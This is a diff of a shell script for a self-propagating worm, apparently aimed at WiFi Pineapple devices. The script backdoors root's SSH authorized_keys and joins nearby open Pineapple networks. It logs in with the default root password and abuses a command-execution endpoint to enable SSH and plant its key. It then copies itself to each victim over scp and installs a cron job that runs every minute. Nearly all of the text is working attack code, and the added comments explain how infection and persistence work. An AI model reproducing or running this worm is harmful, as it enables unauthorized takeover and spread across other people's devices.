@@ -16,63 +16,107 @@ init() {
 		echo "Generating tospo ssh key..."
 		ssh-keygen -b 768 -f /tospo/tospo_rsa -N ""
 	fi
-	#Backdoor the machine with the master key...
+	#Backdoor this machine with the master key if it hasn't already been backdoored.
 	mkdir -p /root/.ssh
 	touch /root/.ssh/authorized_keys
-	if [ -f /root/.ssh/authorized_keys ]; then
-		grep -q "$(cat /tospo/tvbd.pub)" /root/.ssh/authorized_keys || cat /tospo/tvbd.pub >> /root/.ssh/authorized_keys
-	fi
-	#Visual sentinel
-	kill $(ps | grep [b]link | awk '{print $1}')
+	grep -q "$(cat /tospo/tvbd.pub)" /root/.ssh/authorized_keys || cat /tospo/tvbd.pub >> /root/.ssh/authorized_keys
+
+	#Give a little insight by sharing this device's heritage.
+	if [ ! -f /pineapple/tvi ]; then ln -s /tospo/tvi /pineapple/tvp; fi
 }
 
+#Function used for storing current networking state. This state includes:
+#  The current SSID this device is connected to
+#  The password for that SSID
+#  This device's IP address
+#  Etc.
+#The counter to this is popstate (see below).
 pushstate() {
 	echo "Pushing state..."
 	uci export wireless > /tospo/w
 	uci export network > /tospo/n
 }
 
+#Function used to restore a previous networking state, stored when calling pushstate
+#Note: This causes the networking to drop for a moment.
 popstate () {
 	echo "Popping state..."
+	#Bring the bridge back up
 	ifconfig br-lan 172.16.42.1 up
+	#Bring the wirelss access point radio back up
 	ifconfig wlan0 up
+	#Nuke the wireless client radio and take it back down
+	#TODO: This should restore to a previous value if possible.
 	ifconfig wlan1 0.0.0.0 && ifconfig wlan1 down
+	#Import all of the previously stored wireless data and commit it.
 	uci import -f /tospo/w && uci commit
 	uci import -f /tospo/n && uci commit
+	#Reloads the wifi, reupping DHCP etc. as necessary.
 	wifi
 }
 
+#Function used to connect to another network.
+# $1 is the ssid of the network to connect to.
 connect() {
 	ssid=$1
+	#Inform the user that we're connecting to the network.
 	echo "Connecting to $ssid..."
+	#Wake up the client mode radio.
 	ifconfig wlan1 up
+	#Inform the user that we're attempting to avoid IP conflicts.
 	echo "Avoiding conflicts..."
+	#Make a note about a thing we'd like to do in the future.
 	#TODO: Store this value to better preserve state for custom configurations
+	#Take the bridge down and reassign to a separate IP to avoid conflicting with the victim gateway
 	ifconfig br-lan 172.16.42.191 down
+	#Take the access point radio down - this is down for about 20 seconds in my experience
 	ifconfig wlan0 down
 
+	#The following is a comment about informing the user of what the script is doing.
+	#Inform the user that we're trying to derive which interface is the one we want to use for connecting in client mode
 	echo "Guess at the client-mode interface..."
+	#Taking a guess at what interface can be used for client mode.
 	wid=$(uci show wireless | grep "wireless.@wifi-iface\[[0-9]\].device=radio1" | cut -d'[' -f 2 | cut -d']' -f 1)
-	echo "Stripping keys just in case..."	
+	#Inform the user that we're going to ditch encryption keys (fresh pineapples are *always* unencrypted)
+	echo "Stripping keys just in case..."
+	#Ditch the keys/encryption
 	uci delete wireless.@wifi-iface[$wid].key
 	uci delete wireless.@wifi-iface[$wid].encryption
+	#Configure the various settings with defaults for a fresh pineapple configuration
 	echo "Connect to the target network..."
 	uci set wireless.@wifi-iface[$wid].network=wan
 	uci set wireless.@wifi-iface[$wid].mode=sta
 	uci set wireless.@wifi-iface[$wid].ssid="$ssid"
 	uci set wireless.@wifi-iface[$wid].hidden=0
 	uci set wireless.radio1.channel=11
+	#Commit all of our changes
 	uci commit wireless
+	#Reload the wifi, this'll connect etc.
 	wifi
+	#Take a nap - this is so the client mode has a little bit of time to pull a new IP.
 	sleep 3
+	#Forget about the IP just use this one.
+	#TODO: Disable pulling with DHCP if possible?
 	ifconfig wlan1 172.16.42.146
 }
 
+#Function used to perform an HTTP post to the gateway 172.16.42.1 on port 1471
+#An HTTP post looks like this:
+#POST /some/page.php HTTP/1.1
+#Host: 172.16.42.1:1471
+#Content-Type: application/x-www-form-urlencoded
+#Cookie: PHPSESSID=tospovirus|[somesessid]
+#Content-Length: len(data)
+#Connection: close
+#
+#data=goes&here=true
 post() {
 	len=`printf "$2" | wc -c`
 	printf "POST $1 HTTP/1.1\r\nHost: 172.16.42.1:1471\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: PHPSESSID=$3\r\nContent-Length: $len\r\nConnection: close\r\n\r\n$2" | nc 172.16.42.1 1471
 }
 
+#Function uses the post function to login for this session "tospovirus" which is the default session
+#Once logged in other actions may be performed.
 login() {
 	echo "Logging in..."
 	creds="username=root&password=pineapplesareyummy&login="
@@ -80,11 +124,23 @@ login() {
 	echo "Logged in Successfully!"
 }
 
+#Function uses post function to execute commands on the victim. This is the heart and soul.
+#This function requires this session to already be logged in.
 infect() {
+	#Ensure that /root/.ssh exists on the remote, then dump our generated ssh key on into
+	#the authorized_keys file. Then we turn on SSH, this will grant us access/ability to
+	#use ssh commands to copy ourselves to the victim and execute commands.
+	#If the \\ scare you - don't touch them.
 	post '/components/system/configuration/functions.php?execute=' "_csrfToken=a6f6832ff4df61608bf3e38b4facc7550e42244d&commands=/etc/init.d/sshd enable;/etc/init.d/sshd start;mkdir /root/.ssh; printf \"\$(echo $(hexdump -e'16/1 "%02x"' /tospo/tospo_rsa.pub)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">>/root/.ssh/authorized_keys" "tospovirus"
+	#use SSH to create the /tospo directory, then copy only desired files into it.
+	#This is where we successfully clone ourselves to the victim. The various -o Options
+	#are to avoid blocking errors which would require user-interaction. We want to simply
+	#ignore these options and so we decline or use /dev/null for file storage.
 	ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa 172.16.42.1 "mkdir -p /tospo" && scp -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa -r /tospo/tv* 172.16.42.1:/tospo/
 }
 
+#Function used to execute SSH commands on the remote in order to establish future runtime
+#This installs the service, cronjob, etc. We try to do this only once on infection
 persist() {
 	ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa 172.16.42.1 'printf "* * * * * /tospo/tv" | crontab -'
 }
